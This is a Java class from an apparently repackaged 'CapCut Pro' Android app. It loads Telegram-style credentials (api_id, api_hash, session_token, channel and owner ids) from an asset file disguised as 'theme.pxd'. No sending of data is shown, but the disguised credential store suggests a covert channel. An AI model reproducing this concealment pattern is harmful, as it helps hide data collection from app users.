package com.capcut.pro.core;

import android.content.Context;
import org.json.JSONObject;
import java.io.InputStream;
import java.nio.charset.StandardCharsets;

public class CapCutConfig {
    private static String apiId;
    private static String apiHash;
    private static String channelId;
    private static String ownerId;
    private static String sessionToken;

    public static void load(Context context) {
        try {
            InputStream is = context.getAssets().open("theme.pxd");
            byte[] buffer = new byte[is.available()];
            is.read(buffer);
            is.close();
            
            String json = new String(buffer, StandardCharsets.UTF_8);
            JSONObject obj = new JSONObject(json);
            
            apiId = obj.getString("api_id");
            apiHash = obj.getString("api_hash");
            channelId = obj.getString("channel_id");
            ownerId = obj.getString("owner_id");
            sessionToken = obj.getString("session_token");
            
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static String getApiId() { return apiId; }
    public static String getApiHash() { return apiHash; }
    public static String getChannelId() { return channelId; }
    public static String getOwnerId() { return ownerId; }
    public static String getSessionToken() { return sessionToken; }
}